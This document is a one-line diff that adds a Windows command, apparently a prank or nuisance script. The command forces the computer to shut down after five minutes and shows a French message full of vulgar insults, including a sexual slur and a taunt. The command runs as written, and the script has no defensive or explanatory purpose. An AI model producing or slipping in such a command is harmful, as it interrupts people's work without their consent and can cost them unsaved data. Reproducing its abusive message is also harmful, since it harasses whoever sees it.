@@ -1,0 +1,1 @@
+﻿shutdown -s -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t"a bien baiser le cul :)"
